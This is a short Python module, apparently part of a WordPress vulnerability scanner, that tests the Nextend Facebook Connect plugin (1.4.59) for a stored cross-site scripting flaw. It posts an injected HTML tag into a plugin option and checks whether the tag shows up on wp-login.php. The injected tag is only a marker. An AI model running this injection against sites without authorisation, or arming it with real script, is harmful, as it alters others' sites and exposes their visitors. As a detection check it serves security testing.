from ..exploitxss import ExploitXSS


class NextendFacebookConnectXSS(ExploitXSS):

	exploit_info = {
		'exploit_name': 'Nextend Facebook Connect',
		'exploit_version': '1.4.59',
		'exploit_url': 'http://www.exploit-db.com/exploits/35439/'
	}

	def exploit(self):
		exploit = 'newfb_update_options=Y&fb_login_button=<link href="vulnpress"/>'
		hostname = self.hostname

		ExploitXSS.request(hostname, data=exploit, method='POST')

		response = ExploitXSS.request(hostname + '/wp-login.php')

		if response is not None and "vulnpress" in response:
			self.exploitfound(self.exploit_info)
		else:
			self.exploitnotfound(self.exploit_info)
